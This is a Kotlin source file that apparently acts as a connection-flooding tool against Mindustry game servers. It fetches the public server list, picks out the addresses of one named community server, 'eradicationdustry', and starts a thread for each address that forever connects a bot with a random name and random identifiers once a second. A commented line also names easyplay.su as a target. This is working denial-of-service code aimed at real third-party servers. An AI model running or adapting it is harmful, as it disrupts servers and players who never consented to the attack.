package io.lucin

import arc.math.Rand
import arc.struct.Seq
import arc.util.Http
import arc.util.Log
import arc.util.serialization.Base64Coder
import arc.util.serialization.Jval
import io.lucin.core.Entity
import mindustry.Vars
import mindustry.core.*
import mindustry.gen.Groups
import mindustry.net.Packets.ConnectPacket

// Entity.EntityBuilder(false, packet(), "easyplay.su", 6567, 6567)

fun main() {
    init()
    val targets = listOfServes()
    targets.forEach { target ->
        val thread = Thread { task(target) }
        thread.start()
    }
}

private fun init() {
    Groups.init()
    Vars.world = World()

    Vars.content = ContentLoader()
    Vars.content.createBaseContent()

    Vars.state = GameState()

    Version.build = 140
}

private fun packet(): ConnectPacket {
    val packet = ConnectPacket()

    packet.version = -1
    packet.versionType = "official"

    packet.name = Rand().random(-99999, 99999).toString()
    packet.color = 255
    packet.locale = "huy"

    packet.mods = Seq()
    packet.mobile = false

    packet.uuid = uuid()
    packet.usid = usid()

    return packet
}

private fun task(address: String) {
    val fullAddress = address.split(':')
    val ip = fullAddress[0]
    val port = fullAddress[1].toInt()
    while (true) {
        Entity.EntityBuilder(false, packet(), ip, port, port)
        Thread.sleep(1000)
    }
}

private fun listOfServes(): List<String> {
    var output = listOf<String>()
    Http.get("https://raw.githubusercontent.com/Anuken/Mindustry/master/servers_v7.json")
        .error(Log::err)
        .block { res: Http.HttpResponse ->
            if (res.status == Http.HttpStatus.OK) {
                val json = Jval.read(res.resultAsString)
                json.asArray().forEach { server ->
                    if (server.getString("name").lowercase() == "eradicationdustry") {
                        val addresses = server.get("address")
                            .toString()
                            .replace('[', ' ')
                            .replace(']', ' ')
                            .split(',')

                        output = addresses
                    }
                }
            }
        }

    return output
}

private fun uuid(): String {
    val bytes = ByteArray(8)
    Rand().nextBytes(bytes)
    return String(Base64Coder.encode(bytes))
}

private fun usid(): String {
    val result = ByteArray(8)
    Rand().nextBytes(result)
    return String(Base64Coder.encode(result))
}